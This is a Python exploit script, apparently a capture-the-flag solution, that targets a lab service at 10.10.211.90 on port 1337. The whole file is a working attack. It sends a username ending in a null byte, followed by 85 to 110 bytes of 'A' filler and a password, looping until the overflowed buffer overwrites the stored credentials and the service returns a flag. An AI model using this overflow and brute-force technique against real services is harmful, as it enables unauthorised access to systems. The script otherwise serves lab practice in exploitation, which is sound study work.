#!/usr/bin/env python
import socket
import time

TARGET = "10.10.211.90"
PORT = 1337

# The desired username and password parts as bytes.
USERNAME = "bytereaper" + "\x00"  # Null byte terminates the string.
PASSWORD = "5up3rP4zz123Byte"
NEWLINE = "\n"

# We'll try a range of filler lengths to cover possible padding.
# For instance, try filler lengths from 85 to 110.
for filler_len in range(85, 111):
    filler = "A" * filler_len
    payload = USERNAME + filler + PASSWORD + NEWLINE

    print("\n[*] Trying filler length: {}".format(filler_len))
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((TARGET, PORT))
        
        # Receive and discard the initial banner output.
        banner = s.recv(1024)
        # Uncomment the next line to see the banner:
        # print(banner)
        
        # Send the crafted payload.
        s.sendall(payload)
        
        # Wait briefly to allow the server to process.
        time.sleep(0.5)
        response = s.recv(4096)
        decoded_response = response.decode('utf-8', 'ignore')
        print(decoded_response)
        
        # Check if the response contains the flag.
        if "flag{" in decoded_response or "FLAG" in decoded_response or "{" in decoded_response:
            print("\n[+] Potential flag found!")
            s.close()
            break
        
        s.close()
    except Exception as e:
        print("Error: {}".format(e))
